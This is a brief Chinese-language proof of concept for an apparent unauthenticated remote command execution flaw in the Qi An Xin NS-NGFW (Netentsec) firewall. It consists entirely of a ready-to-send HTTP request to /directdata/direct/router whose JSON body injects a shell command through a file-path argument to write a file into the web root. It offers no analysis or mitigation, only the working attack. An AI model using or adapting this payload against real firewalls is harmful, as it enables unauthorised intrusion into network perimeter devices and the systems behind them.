奇安信NS-NGFW 网康防火墙 前台RCE

 http://X.X.X.X/directdata/direct/router

请求头(requestHeader)

Host: X.X.X.X

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

Content-Length: 155

Content-Type: application/json

X-Requested-With: XMLHttpRequest

Accept-Encoding: gzip

请求Body(requestBody)

{

   "action": "SSLVPN_Resource",

   "method": "deleteImage",

   "data": [{

       "data": ["/var/www/html/d.txt;echo '5b926437'>/var/www/html/5b926.txt"]

   }],

   "type": "rpc",

   "tid": 17

}

http://X.X.X.X/directdata/direct/router